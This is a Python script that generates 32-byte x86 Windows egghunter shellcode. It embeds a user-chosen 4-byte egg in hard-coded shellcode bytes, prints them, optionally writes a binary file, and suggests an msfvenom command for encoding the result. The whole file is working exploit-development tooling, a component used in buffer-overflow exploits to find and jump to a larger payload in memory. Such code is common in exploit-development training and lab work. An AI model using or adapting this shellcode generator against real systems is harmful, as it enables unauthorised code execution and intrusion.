#!/usr/bin/python3
import argparse

arg = argparse.ArgumentParser(description="Egghunter shellcode generator")
arg.add_argument("-e", action="store", default="W00T", dest="egg", help="The Egg to be searched for")
arg.add_argument("-o", action="store", dest="out", help="Output to binary file")
args = arg.parse_args()

orig_sc = (b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05"
           b"\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf"
           b"\x75\xe7\xff\xe7")

if len(args.egg) == 4:
    egg = bytearray(args.egg, 'ISO-8859-1')
    new_sc = orig_sc[0:18] + egg[::-1] + orig_sc[22::]
    print("32 byte egghunter shellcode\nEgg = " + args.egg)
    print("\n\""+"".join("\\x%02x" % i for i in new_sc)+"\"")
    if args.out:
        print("\nCreating binary file...\n")
        outFile = open(args.out, "wb")
        outFile.write(new_sc)
        print("Generate encoded egghunter using below command:")
        print("msfvenom -p generic/custom PAYLOADFILE="+ args.out + " -a x86 --platform windows -e <encoder> -f py")
else:
    print("Invalid egg, choose a 4-byte string such as \"W00T\"")
        